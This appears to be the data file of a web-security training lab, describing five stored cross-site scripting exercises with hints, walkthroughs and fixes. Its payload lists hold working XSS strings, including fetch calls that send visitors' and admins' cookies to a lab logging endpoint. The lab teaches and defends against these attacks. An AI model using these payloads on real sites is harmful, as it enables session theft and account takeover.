export const STORED = [
  {
    id: 'stored-guestbook',
    victim: { label: 'Next visitor', path: '/lab/stored-guestbook' },
    title: 'Stored XSS in a guestbook',
    category: 'stored',
    difficulty: 'apprentice',
    app: 'PixelPress Blog',
    tags: ['persistent', 'comments', 'no encoding'],
    summary: 'A guestbook stores your message in the database and prints it raw on every later visit. The payload fires for whoever loads the page next.',
    scenario:
      'PixelPress is a small blog with a public guestbook. Messages are saved to the database and rendered with a string template on every page load. There is no encoding, so a single submission becomes a persistent script that runs for every future reader — including the author, who reviews the page from an admin session.',
    goal: 'Store a payload that executes every time the guestbook is loaded — not just for you once.',
    hints: [
      'Reflected XSS needs a click on a link. Stored XSS needs nothing: the payload is part of the page now.',
      'Look at the guestbook list: entries are inserted as HTML, so tags work.',
      'Try an <img onerror> entry and then reload the page — it fires again on every load.',
    ],
    payloads: [
      { label: 'Persistent script', code: '<script>alert(document.domain)</script>' },
      { label: 'Image handler (survives naive tag filters)', code: '<img src=x onerror=alert(document.domain)>' },
      {
        label: 'Exfiltrate the visitor cookie to the site\'s own console',
        code: "<script>fetch('/api/attack/log?lab=stored-guestbook&src=guestbook&d='+encodeURIComponent(document.cookie))</script>",
      },
    ],
    walkthrough: [
      { t: 'Post something harmless', d: 'Sign the guestbook with your name and "hello". The entry is saved and appears in the list immediately.' },
      { t: 'Check the rendering', d: 'The message is written with innerHTML / raw template output. Nothing is escaped, so markup is live.' },
      { t: 'Store the payload', d: 'Submit `<img src=x onerror=alert(document.domain)>`. It appears in the list and fires on this load.' },
      { t: 'Prove persistence', d: 'Reload the frame (or open the "Victim view" panel). The payload runs again without any new interaction — that is the difference from reflected XSS.' },
      { t: 'Weaponise it', d: 'Swap the alert for the fetch payload above; the visitor\'s document.cookie lands in the attacker console at the bottom of this page.' },
    ],
    why:
      'The database is not a security boundary. Any stored string that reaches an HTML sink makes every page view an attack, for every user and every role. Stored XSS is the type that most often escalates, because the payload eventually gets rendered inside an admin or support session.',
    fix: {
      text: 'Encode on output with the correct context, and treat stored content as untrusted forever. If a comment feature must allow formatting, sanitise on input with an allow-list sanitiser (DOMPurify) AND keep output encoding.',
      code: "// vulnerable (raw template interpolation of user input)\n`<li class=\"msg\">${row.message}</li>`\n\n// fixed\n`<li class=\"msg\">${escapeHtml(row.message)}</li>`",
    },
  },
  {
    id: 'stored-profile',
    victim: { label: 'Admin dashboard', path: '/lab/stored-profile/admin' },
    title: 'Stored XSS in a profile viewed by an admin',
    category: 'stored',
    difficulty: 'practitioner',
    app: 'Nimbus Support',
    tags: ['admin context', 'privilege', 'cookie theft'],
    summary: 'Your "bio" is harmless to you, but the admin dashboard prints every profile raw. The payload runs inside the admin session.',
    scenario:
      'Nimbus lets users fill in a support profile: name, company, bio. The dashboard an agent opens to help you renders those fields raw. A user can therefore plant a script that executes inside an administrator\'s browser — the classic path from low-privilege stored XSS to account takeover.',
    goal: 'Store a payload that runs in the admin view, then send the admin\'s session cookie to the attacker console.',
    hints: [
      'Save a bio containing a normal tag like <b>hi</b> and open the "Admin dashboard" panel to see whether it renders as markup.',
      'The admin panel has a different cookie (session=adm_…, role=admin) — that is what you are after.',
      'fetch() from the payload can reach the same-origin /api/attack/log endpoint; the console below shows what arrives.',
    ],
    payloads: [
      { label: 'Proof of execution in the admin view', code: '<img src=x onerror=alert("admin:"+document.cookie)>' },
      {
        label: 'Send the admin session to the attacker console',
        code: "<img src=x onerror=\"fetch('/api/attack/log?lab=stored-profile&src=admin-profile&d='+encodeURIComponent(document.cookie))\">",
      },
      {
        label: 'Also grab the page the admin is looking at',
        code: "<img src=x onerror=\"fetch('/api/attack/log?lab=stored-profile&src=admin-page&d='+encodeURIComponent(location.pathname+location.search))\">",
      },
    ],
    walkthrough: [
      { t: 'Save a test payload', d: 'In the profile form, set the bio to <b>hello</b>. Open the Admin dashboard panel on the right: it renders bold, so the field is an HTML sink.' },
      { t: 'Escalate to script', d: 'Save `<img src=x onerror=alert(document.cookie)>` and reopen the admin panel. You now see the admin cookie string.' },
      { t: 'Exfiltrate', d: 'Replace the alert with the fetch payload. The console at the bottom of the lab records the request; the admin session value is in the "data" column.' },
      { t: 'Explain the impact', d: 'In a real deployment an attacker replays that value in their own browser and is the admin: no password, no MFA prompt, just a session that was handed over by the browser.' },
    ],
    why:
      'XSS in a privileged view is privilege escalation. The vulnerable page is not the one the victim browses by choice; the attacker only needs their own profile to be rendered by an agent, a moderator or a scheduled report exporter. Blind and stored XSS labs build on exactly this shape.',
    fix: {
      text: 'Contextual encoding everywhere, plus defence in depth: HttpOnly + Secure + SameSite cookies so script cannot read the session, a strict CSP, and sanitisation for any field that must allow markup.',
      code: "// server sets the session cookie\nSet-Cookie: sid=...; HttpOnly; Secure; SameSite=Lax; Path=/\n\n// and the dashboard still encodes output\n<td>${escapeHtml(profile.bio)}</td>",
    },
  },
  {
    id: 'stored-second-order',
    title: 'Second-order XSS (safe input, unsafe output)',
    category: 'stored',
    difficulty: 'practitioner',
    app: 'Greenleaf Store',
    tags: ['second-order', 'invoice', 'context change'],
    summary: 'Your account name is escaped in the UI — but the printable invoice writes it into HTML raw. Same data, second sink.',
    scenario:
      'Greenleaf escapes the customer name when it renders the account page, so every obvious test looks clean. The print/invoice view was written later by a different team and concatenates the same stored value into an HTML table. Input validation was "correct"; the output path was not updated.',
    goal: 'Store a payload in the account name and trigger it through the print view.',
    hints: [
      'The account page shows your name escaped (&lt;b&gt;), so the obvious sink is safe. Look for other places the same field is used.',
      'There is a "Print invoice" link. Print views are frequently built by string concatenation.',
      'Store the payload in the name, then open the print view.',
    ],
    payloads: [
      { label: 'Store this as the account name', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'Same payload, exfiltrating the page', code: "<img src=x onerror=\"fetch('/api/attack/log?lab=stored-second-order&src=invoice&d='+encodeURIComponent(document.body.innerText.slice(0,120)))\">" },
    ],
    walkthrough: [
      { t: 'Prove the first sink is safe', d: 'Save the name `<b>x</b>`. The account page shows the literal text `<b>x</b>` — encoded correctly.' },
      { t: 'Find the second sink', d: 'Click "Print invoice". The same name is placed in an invoice table cell without encoding.' },
      { t: 'Fire it', d: 'With `<img src=x onerror=alert(document.domain)>` stored as the name, the print view executes on load.' },
      { t: 'Generalise the lesson', d: 'Every duplicate of a field is a new sink: emails, PDF exporters, CSV-to-HTML reports, admin search, log dashboards, mobile webviews.' },
    ],
    why:
      'Encoding is applied at the point of use, not at the point of storage. A single value can be safe in one template and deadly in another. Second-order bugs survive code review precisely because the input path looks clean.',
    fix: {
      text: 'Make the sink the enforcement point, and make it impossible to forget: use auto-escaping templates, and treat "print", "export" and "email" renderers as first-class output contexts that need the same encoder.',
      code: "// safe page\n<td>${escapeHtml(customer.name)}</td>\n\n// invoice, written later and forgotten\n`<td>${customer.name}</td>`   // <-- the bug\n\n// rule: no raw interpolation of user data, anywhere",
    },
  },
  {
    id: 'stored-filename',
    title: 'Stored XSS through an uploaded file name',
    category: 'stored',
    difficulty: 'practitioner',
    app: 'Nimbus Docs',
    tags: ['file upload', 'filename', 'innerHTML'],
    summary: 'Uploads are "safe" because only the name is stored — but the document list builds rows with innerHTML, so the name is executable.',
    scenario:
      'Nimbus Docs stores document metadata: name, size, owner. The list view builds each row with a template string and innerHTML. Teams often audit file *contents* and forget that the filename is user input too — and filenames reach HTML the same way any other string does.',
    goal: 'Store a filename that executes when the document list renders.',
    hints: [
      'The lab does not upload bytes; it stores the name you type. That is enough.',
      'Filenames cannot contain quotes on some systems, but browsers and this form will happily accept HTML.',
      'Try breaking out of the row markup with a quote, then add an element.',
    ],
    payloads: [
      { label: 'Break out of the table cell', code: '"><img src=x onerror=alert(document.domain)>.pdf' },
      { label: 'Simpler variant if the cell is not quoted', code: '<img src=x onerror=alert(document.domain)>.pdf' },
    ],
    walkthrough: [
      { t: 'Upload a normal file name', d: 'Type report.pdf and add it. The row shows the name, size and owner.' },
      { t: 'Test the renderer', d: 'Add a file called <b>x</b>.pdf. It renders bold, so the name goes through innerHTML, not a text node.' },
      { t: 'Inject', d: 'Add `"><img src=x onerror=alert(document.domain)>.pdf`. The list re-renders and the handler fires.' },
      { t: 'Note where else this lands', d: 'Filenames appear in admin panels, share links, email notifications and "recent files" widgets — each is a separate sink.' },
    ],
    why:
      'Metadata is user input. Filename, title, description, EXIF and tags are all attacker-controlled strings that get copied into dashboards, exports and emails. Sanitising the upload body does nothing for them.',
    fix: {
      text: 'Build rows with DOM APIs and textContent, or escape at the sink. Also normalise file names server-side (allowlist characters) so downstream systems do not have to defend against them.',
      code: "// vulnerable\nrow.innerHTML = `<td>${file.name}</td><td>${file.size}</td>`;\n\n// fixed\nconst td = document.createElement('td');\ntd.textContent = file.name;\nrow.append(td);",
    },
  },
  {
    id: 'stored-log',
    victim: { label: 'Support audit log', path: '/lab/stored-log/admin' },
    title: 'Stored XSS in an audit log',
    category: 'stored',
    difficulty: 'practitioner',
    app: 'Nimbus Support',
    tags: ['logs', 'support', 'raw rendering'],
    summary: 'Users report problems through a form; the message is written into an audit log that support staff read as HTML.',
    scenario:
      'Every "report a problem" submission is appended to the internal audit log. The log viewer supports links and emphasis (somebody decided markdown-ish HTML was convenient), so it renders entries with innerHTML. The people reading that log are support engineers with elevated access.',
    goal: 'Plant a payload that runs when support opens the audit log.',
    hints: [
      'The report form can only be submitted by you, but the reader is someone else — that is the point.',
      'The log renders HTML so agents can see <b>bold</b> context. Try it.',
      'Check the "Support audit log" panel after submitting.',
    ],
    payloads: [
      { label: 'Execution in the log viewer', code: '<img src=x onerror=alert(document.domain)>' },
      {
        label: 'Exfiltrate what the agent sees',
        code: "<img src=x onerror=\"fetch('/api/attack/log?lab=stored-log&src=audit-log&d='+encodeURIComponent(document.cookie))\">",
      },
    ],
    walkthrough: [
      { t: 'Submit a report', d: 'Use the form: subject "test", message "<b>bold</b>". Open the support log panel — it renders bold, confirming an HTML sink.' },
      { t: 'Plant the payload', d: 'Submit a second report whose message is the img/onerror payload.' },
      { t: 'Open the log as support', d: 'Reload the support panel. The payload executes in that frame, under the support cookie.' },
      { t: 'Think about retention', d: 'Logs are copied to SIEMs, tickets, exports and dashboards. A single stored payload can execute in many internal tools for months.' },
    ],
    why:
      'Internal tools are the highest-value target in the building and get the least security review. Anything a user can write into a system that staff later read in a browser is a stored XSS candidate: log lines, ticket bodies, error reports, filenames, analytics labels.',
    fix: {
      text: 'Render log content as text. If formatting is genuinely needed, sanitise with an allow-list sanitiser and keep a strict CSP on internal tools too — internal does not mean trusted.',
      code: "// vulnerable\nlogRow.innerHTML = entry.message;\n\n// fixed\nlogRow.textContent = entry.message;\n// or, for limited formatting:\nlogRow.innerHTML = DOMPurify.sanitize(entry.message, { ALLOWED_TAGS: ['b','i','a'] });",
    },
  },
];
